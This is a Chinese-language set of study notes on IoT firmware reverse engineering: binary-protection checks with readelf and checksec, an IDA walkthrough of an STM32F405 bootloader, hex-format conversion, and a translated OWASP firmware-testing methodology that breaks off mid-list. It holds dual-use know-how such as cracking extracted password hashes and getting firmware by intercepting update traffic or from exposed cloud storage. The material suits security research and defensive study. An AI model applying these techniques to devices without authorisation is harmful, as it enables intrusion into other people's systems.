href="https://www.cnblogs.com/skullboyer/p/9335127.html">https://www.cnblogs.com/skullboyer/p/9335127.html</a><br /><br /><a href=""><img src="images\799-2.png" alt="images\799-2.png" /></a><br /><br /></div><div class='page'><h1 class='title level-3'>固件静态分析整体思路</h1><br/><h2>固件分析其他重点在于：<br />提取固件加载地址<br />确定固件入口点，通过在入口点处按c进行代码分析，可以识别出固件代码<br />修复固件反汇编代码中的函数名</h2><br /><br />固件解压之后的分析主要集中在对常见漏洞入口进行针对性的静态分析，包括：密码、默认开启的服务、端口、配置文件等。<br />分析方法如下：<br />1）尝试提取文件中包含的明码字段是否存在硬编码密码等。<br />2）发掘固件的关联性，包括分析固件作者、库使用、目录结构、配置文件关键字、定制默认密码等信息。<br />3）对二进制可执行文件进行反汇编分析，可以借用一些成熟的工具软件，如：IDA Pro、Capstone等。对特定的嵌入式系统（如VxWorks）的登录模块进行反汇编分析，获取其登录密码的哈希算法等信息。<br />IDA Pro是应用最广泛的静态反汇编工具，它支持对大量的CPU架构进行逆向分析，包括X86、MIPS、PowerPC及Arm等。<br />Capstone是一个反汇编框架，它支持多种平台，能够运行在Windows、Mac OS X、Linux、 FreeBSD、OpenBSD和Solaris中。Capstone可反汇编ARM、ARM64 (ARMv8)、MIPS、PPC和X86架构下的应用。<br />4）如果发现包含密码哈希的文件，可考虑使用John the Ripper或Hash Suite等工具进行暴力破解。前者有版本支持GPU加速（支持CUDA和OpenCL）。使用暴力破解工具可以利用前述步骤中提取的关键字，显著加快运行效率。</div><div class='page'><h1 class='title level-3'>环境搭建</h1><br/>固件分析环境搭建-系统选择<br />Windows + Ubuntu16.04<br />固件分析环境搭建-固件提取<br />dd(Linux 自带，可以用于分区)<br />binwalk(github:<a href="https://github.com/ReFirmLabs/binwalk)">https://github.com/ReFirmLabs/binwalk)</a><br />固件分析环境搭建-二进制应用分析<br />angr<br />IDA<br />Ghidra<br />gdb(gef/pwndbg/peda)<br />固件分析环境搭建-固件模拟<br />qemu<br />firmadyne<br /></div><div class='page'><h1 class='title level-3'>脚本识别固件函数与字符串</h1><br/>脚本链接<br /><a href="http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip">http://www.devttys0.com/wp-content/uploads/2011/07/ida_scripts.zip</a><br />脚本名<br />ida_scripts.zip<br /><a href=""><img src="images\646-1.png" alt="images\646-1.png" /></a></div><div class='page'><h1 class='title level-3'>裸机编程固件分析</h1><br/>裸机固件以文本文件形式进行存储，需要使用指定python库将其转为二进制文件<br />分析裸机固件时需要确定固件的加载地址以及入口点<br />系统bootloader均为裸机程序<br /><br /><h2>固件加载地址即固件整体在内存空间中的首地址<br />入口点即固件中第一个开始执行的函数的地址<br />入口点不一定和固件加载地址相同</h2></div><div class='page'><h1 class='title level-4'>分析固件二进制保护策略</h1><br/><a href="物联网安全--固件--固件分析资料收集--OWASP固件安全分析手册--非官方译文.html#固件二进制保护策略分析">资料来源</a><br /><h3>常见的二进制分析包括以下内容：</h3><br /><strong><h3>· </h3></strong><h3>启用或禁用stack canaries</h3><br />◇ <code>$ readelf -aW bin/*| grep stack_chk_fail</code><br />◇ <code>$ mips-buildroot-linux-uclibc-objdump -d bin/binary | grep stack_chk_fail</code><br /><br /><strong><h3>· </h3></strong><h3>启用或禁用与位置无关的可执行文件（PIE）</h3><br />◇ PIE disabled<br />▪ <code>$ readelf -h &lt;bin&gt; | grep -q &#39;Type:[[:space:]]*EXEC&#39;</code><br />◇ PIE enabled<br />▪ <code>$ readelf -h &lt;bin&gt; | grep &#39;Type:[[:space:]]*DYN&#39;</code><br /><br />◇ DSO<br />▪ <code>$ readelf -d &lt;bin&gt; |  grep -q &#39;DEBUG&#39;</code><br /><br />◇ Symbols<br />▪ <code>$ readelf --syms &lt;bin&gt;</code><br />▪ <code>$ nm &lt;bin&gt;</code><br /><br /><br />• 可识别的字符串，即使用strings命令<br />◇ <code>-el</code> 指定16位宽的小端字符（例如UTF-16）. <br />◇ Use <code>-eb</code> for big endian<br />◇ Prints any ASCII strings longer than 16 to stdout<br />◇ The <code>-t</code> flag will return the offset of the string within the file. <br />◇ <code>-tx</code> will return it in hex format, T-to in octal and <code>-td</code> in decimal. <br />◇ Useful for cross-referencing with a hex editor, or want to know where in the file your string is.<br />◇ <code>strings -n5 &lt;bin&gt;</code><br />◇ <code>strings -el &lt;bin&gt;</code><br />◇ <code>strings -n16 &lt;bin&gt;</code><br />◇ <code>strings -tx &lt;bin&gt;</code><br /><br />• Non-executable (NX) enabled or disabled  E”表示堆栈是可执行的。<br />◇ <code>$ readelf -lW bin/&lt;bin&gt;| grep STACK</code><br /><code>GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4</code><br /><br /><br />$ execstack bin/*<br />X bin/ash<br />X bin/busybox<br /><br />重定位只读（RELRO）配置<br /><strong><h3>· </h3></strong><h3>完整的RELRO</h3><br />- <code>$ readelf -d binary | grep BIND_NOW</code><br /><strong><h3>· </h3></strong><h3>部分RELRO</h3><br />- <code>$ readelf -d binary | grep GNU_RELRO</code><br /><br /><br /><h3>自动检查上述许多二进制属性的脚本是</h3><a href="https://github.com/slimm609/checksec.sh">checksec.sh</a><h3>。下面是使用脚本的两个示例。</h3><br /> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/bin/busybox<br /> <br /> ./checksec --file=/home/embedos/firmware/_IoTGoat-x86-generic-combined-squashfs.img.extracted/squashfs-root/usr/bin/shellback<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwODIyMTE1MzczMC5wbmc?x-oss-process=image/format,png"><img src="images\686-1.png" alt="images\686-1.png" /></a><br /><h3>图片：Checksec.sh</h3></div><div class='page'><h1 class='title level-4'>裸机二进制程序分析实例</h1><br/><h3> STM32F405 的系统引导加载程序</h3><br /><a href="物联网安全--固件--固件分析资料收集--固件逆向分析过程中的工具和技巧.html">参考资料</a><br /><br /><h3>将裸机二进制文件加载到 IDA 中</h3><br /><h3>分析裸机时，IDA 仍然是最有用的 (也是最通用的) 逆向分析程序。关于如何使用裸机二进制文件，相关文章很多。但是，通常情况下，分析裸机二进制文件时，你需要知道加载地址和入口点。</h3><br /><h3>加载地址是正在执行二进制文件的内存中的地址，入口点是处理器开始执行的二进制文件中的位置。</h3><br /><h3>同样，你需要记住正在分析的固件的环境，了解内核及其特性对分析会有很大帮助。如果你正在查看运行在 Cortex-M 上的某些内容，你可能会发现自己非常熟悉的 infocenter.arm.com 网站。</h3><br /><h3>以下，我将使用裸机 ARM 二进制文件为例进行说明，因为裸机 ARM 非常常见。</h3><br /><h3>让我们看看 STM32F405 的系统引导加载程序，如果你已经提前安装好了，就可以无拘无束的进行内存访问了。由于 STM32 数据表都是在线的发布的，所以我们可以通过 google 找到 STM32F405 的数据表。</h3><br /><a href="https://img.chainnews.com/material/images/bd5860e37017348884b3630793c46203.jpg-article"><img src="images\671-1.png" alt="images\671-1.png" /></a><br /><h3>数据表显示，引导加载程序位于“系统内存”中，但具体是在哪里？</h3><br /><a href="https://img.chainnews.com/material/images/ddd074a893176753c86b6f62be9323f1.jpg-article"><img src="images\671-2.png" alt="images\671-2.png" /></a><br /><h3>根据上图的提示，系统内存位于 0x1fff0000。</h3><br /><h3>因此，将 0x1fff0000 到 0x1fff77ff 之间的所有内存逆向分析到一个文件之后，我们就可以进行一些快速的完整性检查，顺带检查一下里面有没有字符串。</h3><br /><h3>$ strings -n5 stm32f405.bin</h3><br /><h3>s F</h3><br /><h3>1`hC1 hA</h3><br /><h3>rAh</h3><br /><h3>CA`b{</h3><br /><h3>pGZHJ</h3><br /><h3>!1Ccs</h3><br /><h3>[…snip…]</h3><br /><h3>a</h3><code><h3>hK!Aa</h3></code><h3>h</h3><br /><h3>QAarH@h</h3><br /><h3>h@$@!</h3><br /><h3>beta1</h3><br /><h3>相当多字符串都是无用的，只有以下的这些对分析有用。</h3><br /><h3>$ strings -el stm32f405.bin</h3><br /><h3>@Internal Flash /0x08000000/04</h3><em><h3>016 Kg,01</h3></em><h3>064 Kg,07*128 Kg</h3><br /><h3>@OTP Memory /0x1FFF7800/01</h3><em><h3>512 e,01</h3></em><h3>016 e</h3><br /><h3>@Option Bytes /0x1FFFC000/01*016 e</h3><br /><h3>@Device Feature/0xFFFF0000/01*004 e</h3><br /><h3>STMicroelectronics</h3><br /><h3>STM32 BOOTLOADER</h3><br /><h3>STM32F2STM32</h3><br /><h3>&quot;11</h3><br /><h3>我们还可以检查代码编译的目的是什么，以及什么是字节顺序。为此，我们可以再次使用 binwalk。</h3><br /><h3>binwalk 有一个内置的操作码扫描器，它使用-Y 标志激活。它不执行常规的 binwalk 魔术字节扫描活动。相反，它只是使用 Capstone 引擎检查所有主要体系结构的有效指令并报告它找到的内容，包括有多少连续有效指令，体系结构和字节顺序。如果你只想对正在查看的某些固件进行快速的检查，这是非常有用的。</h3><br /><h3>以下显示的就是 binwalk 运行在一个 STM32F405 引导加载程序的过程：</h3><br /><h3>$ binwalk -Y stm32f405.bin</h3><br /><h3>DECIMAL HEXADECIMAL DESCRIPTION</h3><br /><h3>--------------------------------------------------------------------------------<br />0 0x0 ARM executable code, 16-bit (Thumb), little<br />endian, at least 1079 valid instructions</h3><br /><h3>但是，需要注意的是，binwalk<br />-Y 只是负责检查文件是否包含有效字节码的一种简单方法。它没有告诉你任何关于固件本身的有用信息，只会告诉你里面有没有有效的字节码。</h3><br /><h3>唯一的有用信息是让我们知道，字节码是从偏移量 0 处开始的，Capstone 引擎可以将字节读取为有效的 LITTLE-ENDIAN （低字节序） Thumb 代码。本示例中，我们得到了 1079 条有效指令，这是相当多的代码。然后，我们可以将这个逆向分析装载到 IDA 中。</h3><br /><h3>译者注：Capstone 是一个轻量级的多平台多架构支持的逆向分析框架。支持包括 ARM，ARM64，MIPS 和 x86/x64 平台。</h3><br /><h3>LITTLE-ENDIAN （小字节序、低字节序）, 即低位字节排放在内存的低地址端，高位字节排放在内存的高地址端，与之对应的是：BIG-ENDIAN （大字节序、高字节序）。</h3><br /><h3>在 IDA 中打开文件，你将看到常用的弹出窗口。此时 IDA 不会为你解决任何问题，因此你需要将“处理器类型”更改为“ARM Little-endian<br />[ARM]”，然后单击“设置”。</h3><br /><a href="https://img.chainnews.com/material/images/36e5769a3f82b98cf826b6f3e8ce094a.jpg-article"><img src="images\671-3.png" alt="images\671-3.png" /></a><br /><h3>如果你想删除 ARM 代码，并且只使用 Thumb 代码，你可以执行以下操作：</h3><br /><h3>点击“处理器选项”，弹出“ARM 特定选项”窗口。</h3><br /><a href="https://img.chainnews.com/material/images/dd1a79ea08296cbc7c2314e913489743.jpg-article"><img src="images\671-4.png" alt="images\671-4.png" /></a><br /><h3>点击“编辑 ARM 架构选项”按钮：</h3><br /><a href="https://img.chainnews.com/material/images/f5bc8571266fbdf978b3424d2d028ffd.jpg-article"><img src="images\671-5.png" alt="images\671-5.png" /></a><br /><h3>在“ARM 架构选项”窗口中，将“ARM 指令”设置为“否”。保留 Thumb 说明，按下“OK”“OK”“OK”，此时，IDA 将再次提示你，这次要求你配置内存。</h3><br /><h3>由于我们已经知道引导加载程序的地址是 0x1FFF0000，因此我们可以在 ROM 起始地址字段中输入 0x1FFF0000。另外，我们还需要设置“加载地址”来反映这一点，所以你也应该把 0x1FFF0000 放在那里。</h3><br /><a href="https://img.chainnews.com/material/images/4743f184ec7595557cc033793c0cbd55.jpg-article"><img src="images\671-6.png" alt="images\671-6.png" /></a><br /><h3>单击“OK”，可能会弹出一个小窗口，提示你可以使用 Alt+G 组合键在 ARM 和 Thumb 指令之间切换。有时候这也是一个很好的技巧，但不是很直观，我现在给你示范一下。</h3><br /><h3>加载二进制文件后，如果单击一个地址（例如，在此示例中，它是 0x1FFF0000 处的二进制基数），然后按 Alt + G，将弹出“Segment<br />Register Value”窗口。</h3><br /><a href="https://img.chainnews.com/material/images/19ce2421d5473da533a2014478fbeb48.jpg-article"><img src="images\671-7.png" alt="images\671-7.png" /></a><br /><h3>0x1 的“值”表示这一地址之后的代码 (0x1FFF0000) 将被视为 Thumb 代码，这意味着，ARM 处理器状态寄存器中的“T”标志，会将“T”标志设置为 1，以表示正在执行 Thumb 代码，并且标志 0 表示正在执行 ARM 代码。</h3><br /><h3>注意：CODE16 也会放在那个地址中，其作用就是提示你。如果将它设置为 0x0，它将被视为 ARM 处理器状态。在这种情况下，CODE32 也将会放在那个地址中。</h3><br /><h3>你可以稍后在文件中单击任何其他地址并将值设置为 0x0，并在该地址之后的代码将被视为 ARM。但无论如何，我们不希望这样做，我们希望所有内容都被视为 Thumb，所以它被设为 0x1。</h3><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\671-8.png" alt="images\671-8.png" /></a><h3><br />入口点在哪里？</h3><br /><a href="https://img.chainnews.com/material/images/9733f581deed6f5d9df1b2e881d81bed.jpg-article"><img src="images\671-9.png" alt="images\671-9.png" /></a><br /><h3>这一步，我们也要用到 IDA。</h3><br /><h3>我们可以通过查看中断向量表来确定入口点，只需要知道表中的哪个元素是重置向量即可，因为重置向量就是我们的入口点。重置向量是当设备重置时，CPU 将开始执行代码的地址。</h3><br /><h3>STM32F405 具有 Cortex-M4 内核，因此我们可以使用 Google 查找 Cortex-M4 向量表。在 Cortex-M4 设备通用用户指南中，我们可以发现以下内容。</h3><br /><a href="https://img.chainnews.com/material/images/b91c0a80bc969f9ee0f17c85c201dc5d.jpg-article"><img src="images\671-10.png" alt="images\671-10.png" /></a><br /><h3>还有这个：</h3><br /><a href="https://img.chainnews.com/material/images/9fdb1a6113d123641b8e70e48305039b.jpg-article"><img src="images\671-11.png" alt="images\671-11.png" /></a><br /><h3>这很有趣，让我们先记住它们。</h3><br /><h3>这个有用的表显示偏移量 0x0 处的指针是初始堆栈指针位置，偏移量 0x4 处的指针是重置向量，偏移量 0x8 处的指针是不可掩码中断的，重置向量是处理器在启动时开始执行代码的地址。</h3><br /><h3>在 IDA 中，我们可以将地址 0x0、0x4、0x8 等处的数据定义为“ DWORD”。DWORD 全称 Double<br />Word, 是指注册表的键值 , 每个 word 为 2 个字节的长度 ,DWORD<br />双字即为 4 个字节 , 每个字节是 8 位 , 共 32 位。右键单击地址 0x1FFF0000 处的字节，然后单击“ DWORD”，最后在 0x1FFF0004 处执行相同的操作。</h3><br /><a href="https://img.chainnews.com/material/images/701bace843909ec6b4f4f0d64584aaae.jpg-article"><img src="images\671-12.png" alt="images\671-12.png" /></a><br /><h3>看看我们从下图中得到了什么，我自己也添加了评论。这些看起来很合理。0x0 偏移处的初始堆栈指针值指向一个 SRAM 的内存块。我们了解该内存块，是因为我们在数据表中读取了它。</h3><br /><a href="https://img.chainnews.com/material/images/ce228d94054485298b82d803bcab039a.jpg-article"><img src="images\671-13.png" alt="images\671-13.png" /></a><br /><h3>重置向量 0x1FFF3DA1 也有意义，现在让我们跳到 IDA 中的那个位置。要么高亮显示并按下“Enter”，要么右键单击并选择“跳转到操作数”。</h3><br /><a href="https://img.chainnews.com/material/images/76c3d029132206eb7c31ca25bae5a2a3.jpg-article"><img src="images\671-14.png" alt="images\671-14.png" /></a><br /><h3>请注意：在 Thumb 模式下，重置向量的最小有效位加了 1。所以，实际的重置向量要减去 1。</h3><br /><a href="https://img.chainnews.com/material/images/483469d7eed816bbd7d3d2b0c11e52b7.jpg-article"><img src="images\671-15.png" alt="images\671-15.png" /></a><br /><h3>注意，此时 IDA“stripe”(在顶部) 完全是芥末色的，这意味着到目前为止文件中没有任何内容被定义。所以，我们的目的就是要对它们进行定义。</h3><br /><h3>点击复位向量减 1 后的地址，按“C”，IDA 将开始逆向分析。</h3><br /><a href="https://img.chainnews.com/material/images/e3d426028122c72085cbdcbbcd2c319e.jpg-article"><img src="images\671-16.png" alt="images\671-16.png" /></a><br /><h3>这看起来很合理，已经定义了许多子例程，所以在 IDA “stripe”中有相当多的蓝色。对于向量表中的其他惟一指针，继续相同的操作，你将看到更多的蓝色出现。</h3><br /><a href="https://img.chainnews.com/material/images/920c0ef1ae56552cefe703db068ec81a.jpg-article"><img src="images\671-17.png" alt="images\671-17.png" /></a><br /><h3>现在，你可以开始了解固件复杂的内部工作原理。</h3><br /><a href="https://img.chainnews.com/material/images/ec5c3a22f795c8cbd1ee534aa0917a40.jpg-article"><img src="images\671-18.png" alt="images\671-18.png" /></a><br /><h3>让我们快速地看一下这个子例程，以帮助你继续分析。在这个子例程中，你可以看到值 0x40023C04 被加载到 R0 中，然后 0x45670123 和 0xCDEF89AB 被依次写入 0x40023C04 的内存中。</h3><br /><h3>图中红色突出显示的地址指的是将要访问的内存，它没有映射到 IDA 文件中。因此，当前 IDA 文件中没有映射 0x40023C04 的内存。其实你不需要映射它，但可能需要在数据表中查找它的用途。</h3><br /><h3>通过查看 STM32F4 数据表，我们可以看到 0x40023C04 指的是 Flash 接口寄存器内存段中的某个地址。</h3><br /><a href="https://img.chainnews.com/material/images/72751cc5010adc085cdc26d06e6ba10f.jpg-article"><img src="images\671-19.png" alt="images\671-19.png" /></a><br /><h3>并且 0x40023C00 基址的偏移量 0x4 指的是闪存密钥寄存器（FLASH_KEYR）：</h3><br /><a href="https://img.chainnews.com/material/images/2fc7ab7135cd15a5291614d17d03c320.jpg-article"><img src="images\671-20.png" alt="images\671-20.png" /></a><br /><h3>可以看到，数据表中有 0x45670123 和 0xCDEF89AB 值，它们是解锁 Flash 控制寄存器的密钥。这就是这个子例程的作用。</h3><br /></div><div class='page'><h1 class='title level-4'>裸机固件文本格式</h1><br/><a href="物联网安全--固件--固件分析资料收集--固件逆向分析过程中的工具和技巧.html">参考资料</a><br /><h2>如果目标设备运行的是裸机 MCU，你可能会发现固件文件以文本文件的形式进行转储，且被转化为十六进制，需要使用bincopy python 库转换为二进制文件进行分析。<br /></h2><h3><br />(通常带有一些预先编写的标识符代码或偏移地址 / 位置，并且可能在每行附加一个校验和)。在处理这些文件之前，首先需要将它们转换成二进制格式。通常，你可能会遇到一些常见的文件格式。</h3><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\672-1.png" alt="images\672-1.png" /></a><h3><br />Motorola S-records 文件格式</h3><br /><h3>Motorola S-records 文件格式有时被称为 SREC，所有的 S-record 文件行都以大写 s 开头。</h3><br /><a href="https://img.chainnews.com/material/images/8b3d0645ea6dfb792400bab0d9c05e2f.jpg-article"><img src="images\672-2.png" alt="images\672-2.png" /></a><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\672-3.png" alt="images\672-3.png" /></a><h3><br />Intel HEX 格式</h3><br /><h3>与 SREC 类似，Intel 的十六进制行都以冒号开头。</h3><br /><a href="https://img.chainnews.com/material/images/def48defc058de361bbc91082e9de333.jpg-article"><img src="images\672-4.png" alt="images\672-4.png" /></a><br /><a href="https://img.chainnews.com/material/images/1740af5efd48c66c6286cc2eb4eb271f.jpg-article"><img src="images\672-5.png" alt="images\672-5.png" /></a><h3><br />TI-TXT</h3><br /><h3>TI-TXT 是德州仪器的一种格式，通常用于 MSP430 系列。内存地址以“@”开头，数据以十六进制表示。看起来大致是这样的：</h3><br /><a href="https://img.chainnews.com/material/images/6854f25ef85c21a7ab4014b88222c753.jpg-article"><img src="images\672-6.png" alt="images\672-6.png" /></a><br /><h3>所有 Motorola S-record、Intel HEX 和 TI-TXT 文件都可以使用 bincopy python 库转换为二进制文件。</h3><br /></div><div class='page'><h1 class='title level-3'>识别反汇编函数名</h1><br/>主要思路，识别固件中的符号表，并通过写IDA的python脚本修复<br /></div><div class='page'><h1 class='title level-4'>VxWorks:分析符号表并修复</h1><br/>分析符号表结构、确定符号表起始和结束位置，编写python脚本修复<br /><a href=""><img src="images\655-1.png" alt="images\655-1.png" /></a><br /></div><div class='page'><h1 class='title level-4'>VxWorks:识别符号表</h1><br/>使用binwalk识别vxwork符号表<br /><a href=""><img src="images\653-1.png" alt="images\653-1.png" /></a><br /><br /></div><div class='page'><h1 class='title level-4'>分析实例</h1><br/><a href="物联网安全--固件--嵌入式操作系统--vxworks--分析--确定函数符号表.html">VxWorks识别反汇编函数名</a></div><div class='page'><h1 class='title level-3'>提取固件加载地址</h1><br/>由于嵌入式系统的固件需要加载到内存中的特定位置进行运行，这个特定的位置叫做固件加载地址（base address）。<br />嵌入式系统固件的函数调用地址是基于固件加载地址所计算出的内存位置，而不是固件中的偏移量位置。<br />因此，为了使反汇编工具软件（如IDA Pro）能够正确的分析函数调用关系，我们需要分析出固件加载地址，否则所有的函数调用关系都将是错误的。<br />针对使用ELF封装的固件文件，在ELF文件的头部有特定的数据位记录了该固件的加载地址，因此我们可以直接读取ELF文件头，从而直接获取到固件的加载地址。<br />如果固件没有使用任何封装，那么就需要对固件的代码进行逆向，从而分析出固件的加载地址。这个方法比较复杂，针对不同的嵌入式系统及CPU架构都有区别。<br />针对VxWorks的固件，我们将通过分析固件头部的代码调用来大致猜测固件的加载地址。<br /></div><div class='page'><h1 class='title level-4'>VxWorks:逆向固件加载地址</h1><br/>使用binwalk确定固件架构、使用ida分析识别出来的函数，通过函数调用特征，确定函数加载基址<br />（函数调用时常常通过 加载基址+偏移 定位函数地址）<br /><a href=""><img src="images\654-1.png" alt="images\654-1.png" /></a></div><div class='page'><h1 class='title level-4'>分析实例</h1><br/><a href="物联网安全--固件--嵌入式操作系统--vxworks--分析--确定固件加载基址.html">VxWorks确定固件加载地址</a></div><div class='page'><h1 class='title level-2'>固件分析资料收集</h1><br/></div><div class='page'><h1 class='title level-3'>OWASP固件安全分析手册</h1><br/>原文：<a href="https://scriptingxss.gitbook.io/firmware-security-testing-methodology/">https://scriptingxss.gitbook.io/firmware-security-testing-methodology/</a><br />官方译文：<a href="https://scriptingxss.gitbook.io/firmware-security-testing-methodology/v/zhong-wen-fstm/">https://scriptingxss.gitbook.io/firmware-security-testing-methodology/v/zhong-wen-fstm/</a><br />非官方译文：<a href="https://blog.csdn.net/systemino/article/details/105756905">https://blog.csdn.net/systemino/article/details/105756905</a><br />官方译文与非官方译文存在互补关系，两者均可着重看</div><div class='page'><h1 class='title level-4'>csdn译文截图版</h1><br/><a href=""><img src="images\660-1.png" alt="images\660-1.png" /></a><br /><a href=""><img src="images\660-2.png" alt="images\660-2.png" /></a><br /><a href=""><img src="images\660-3.png" alt="images\660-3.png" /></a></div><div class='page'><h1 class='title level-4'>OWASP的iot镜像挑战</h1><br/><a href="https://github.com/OWASP/IoTGoat/wiki/IoTGoat-challenges">https://github.com/OWASP/IoTGoat/wiki/IoTGoat-challenges</a></div><div class='page'><h1 class='title level-4'>非官方译文</h1><br/>原文：<a href="https://scriptingxss.gitbook.io/firmware-security-testing-methodology/">https://scriptingxss.gitbook.io/firmware-security-testing-methodology/</a><br />原文译文：<a href="https://scriptingxss.gitbook.io/firmware-security-testing-methodology/v/zhong-wen-fstm/">https://scriptingxss.gitbook.io/firmware-security-testing-methodology/v/zhong-wen-fstm/</a><br />译文：<a href="https://blog.csdn.net/systemino/article/details/105756905">https://blog.csdn.net/systemino/article/details/105756905</a><br /><br /><h3>无论是公网连接还是独立网络，固件都是控制嵌入式设备的核心。因此，必须要了解如何分析固件以执行未授权的功能。要开始进行安全测试和固件逆向，在即将进行评估时，请使用以下方法作为指导。该方法包括九个阶段，旨在使安全研究人员，软件开发人员和信息安全专业人员能够进行固件安全测试研究。</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjIvMTU4NzUyOTY3NTE2MTA4MS5wbmc?x-oss-process=image/format,png"><img src="images\689-1.png" alt="images\689-1.png" /></a><br /><h3>以下各节将在适用的情况下通过支持示例进一步详细介绍每个阶段。</h3><br /><h3>原文报告如下：</h3><br /><a href="https://scriptingxss.gitbook.io/firmware-security-testing-methodology/">https://scriptingxss.gitbook.io/firmware-security-testing-methodology/</a><br /><h3>可以通过以下</h3><a href="https://tinyurl.com/EmbedOS-2020">链接</a><h3>下载Ubuntu虚拟机（EmbedOS），其中包含在本文档中使用的固件测试工具。有关EmbedOS工具的详细信息，可以在以下存储库</h3><a href="https://github.com/scriptingxss/EmbedOS">https://github.com	/scriptingxss/EmbedOS中的</a><h3> GitHub上找到。</h3><br /> https://tinyurl.com/EmbedOS-2020<br /> https://github.com/scriptingxss/EmbedOS<br /><strong><h3>0x01 信息收集</h3></strong><br /><h3>在此阶段，收集有关目标的尽可能多的信息，以了解其基础技术的总体组成。</h3><a href="https://www.21ct.cc/">奇热</a><h3>尝试收集以下内容：</h3><br /><strong><h3>· </h3></strong><h3>支持的CPU架构</h3><br /><strong><h3>· </h3></strong><h3>操作系统平台</h3><br /><strong><h3>· </h3></strong><h3>引导程序配置信息（Bootloader configurations）</h3><br /><strong><h3>· </h3></strong><h3>硬件原理图</h3><br /><strong><h3>· </h3></strong><h3>数据表</h3><br /><strong><h3>· </h3></strong><h3>代码行（LoC）估计</h3><br /><strong><h3>· </h3></strong><h3>源代码存储库位置</h3><br /><strong><h3>· </h3></strong><h3>第三方组件</h3><br /><strong><h3>· </h3></strong><h3>开源许可证（例如GPL）</h3><br /><strong><h3>· </h3></strong><h3>更新日志</h3><br /><strong><h3>· </h3></strong><h3>FCC ID</h3><br /><strong><h3>· </h3></strong><h3>设计和数据流程图</h3><br /><strong><h3>· </h3></strong><h3>威胁模型</h3><br /><strong><h3>· </h3></strong><h3>以前的渗透测试漏洞报告</h3><br /><strong><h3>· </h3></strong><h3>漏洞平台放出的漏洞（例如BugCrowd或HackerOne）</h3><br /><h3>上面列出的信息应在安全测试工作之前收集好，确保利用内部产品线开发团队来获取准确和最新的数据。了解应用的安全控制以及项目资料，已知的安全问题以及与漏洞有关的信息。</h3><br /><h3>在可能的情况下，使用开源情报（OSINT）工具和技术来获取数据。如果使用开源软件，需要下载存储库，并根据代码库执行手动和自动静态分析。有时，开源软件已经使用了提供扫描结果的供应商提供的免费静态分析工具，例如</h3><a href="https://scan.coverity.com/">Coverity Scan</a><h3>和</h3><a href="https://lgtm.com/#explore">Semmle的LGTM</a><h3>。例如，下面的截图显示了</h3><a href="http://www.denx.de/wiki/U-Boot/WebHome">Das U-Boot</a><h3>在Coverity Scan中的信息摘要。</h3><br /> https://scan.coverity.com/<br /> <br /> http://www.denx.de/wiki/U-Boot/WebHome<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzQ5MzE2NDg0NS5wbmc?x-oss-process=image/format,png"><img src="images\689-2.png" alt="images\689-2.png" /></a><br /><h3>图片：U-Boot覆盖率扫描</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzUzNTYyNDI5MS5wbmc?x-oss-process=image/format,png"><img src="images\689-3.png" alt="images\689-3.png" /></a><br /><h3>图片：U-Boot覆盖率扫描分析</h3><br /><h3>以下是LGTM在</h3><a href="https://github.com/mkj/dropbear">Dropbear</a><h3>的分析结果截图。</h3><br /> https://github.com/mkj/dropbear<a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzYyMTE3NzY4Mi5wbmc?x-oss-process=image/format,png"><img src="images\689-4.png" alt="images\689-4.png" /></a><br /><h3>图片：LGTM Dropbear分析</h3><br /><a href="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcuNGhvdS5jb20vdXBsb2Fkcy91ZWRpdG9yL3BocC91cGxvYWQvaW1hZ2UvMjAyMDA0MjQvMTU4NzcwNzgyMTE3OTM4MS5wbmc?x-oss-process=image/format,png"><img src="images\689-5.png" alt="images\689-5.png" /></a><br /><h3>图片：LGTM Dropbear分析结果</h3><br /><h3>掌握了这些信息后，应进行威胁建模，以分析出攻击面和影响范围。</h3><br /><strong><h3>0x02 获取固件</h3></strong><br /><h3>要开始查看固件内容，必须获取固件映像文件。尝试使用以下一种或多种方法获取固件内容：</h3><br /><strong><h3>· </h3></strong><h3>直接从开发团队，制造商和供应商或客户那里获取</h3><br /><strong><h3>· </h3></strong><h3>使用制造商提供的说明文件从头开始编译</h3><br /><strong><h3>· </h3></strong><h3>从供应商的支持站点下载</h3><br /><strong><h3>· </h3></strong><h3>针对文件扩展名和文件共享平台（例如Dropbox，Box和Google驱动器）进行Google dork查询</h3><br /><strong><h3>· </h3></strong><h3>通常，用户会将固件内容上传到论坛，博客或在与制造商联系以解决问题并通过zip或flash驱动器获得固件的网站上申请固件。</h3><br /><strong><h3>· </h3></strong><h3>更新时做中间人（MITM）固件流量截获</h3><br /><strong><h3>· </h3></strong><h3>从暴露的云提供商存储（例如Amazon Web Services（AWS）S3）下载Build版本</h3><br /><strong><h3>· </h3></strong><h3>通过UART，JTAG，PICit等直接从硬件中提取</h3><br /><strong><h3>· </h3></strong><h3>嗅探硬件组件内的串行通信以更新服务器请求</h3><br /><strong><h3>· </h3></strong><h3>通过移动应用程序内的硬编码端点获得固件</h3><br /><strong><h3>· </h3></strong><h3>将固件从引导加载程序（例如U-boot）转储到flash或通过tftp网络转储</h3><br /><strong><h3>· 